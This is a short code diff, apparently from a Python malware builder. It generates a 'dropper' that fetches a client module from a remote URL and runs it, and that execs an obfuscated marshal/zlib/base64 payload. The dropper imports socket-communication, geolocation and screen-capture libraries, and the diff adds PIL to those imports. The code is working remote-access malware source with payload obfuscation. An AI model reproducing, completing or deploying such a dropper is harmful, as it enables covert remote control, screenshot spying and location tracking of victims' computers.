@@ -166,7 +166,7 @@ def create_moduel(url):
   return module
 create_moduel(url+"client/client.py").run(url, file_path)"""
             
-        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,geocoder,requests,importlib.util,mss
+        dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,geocoder,requests,importlib.util,mss,PIL
 from urllib.request import urlopen
 exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.compress(marshal.dumps(payload,2))))}))))
 #{uuid.uuid4()}"""
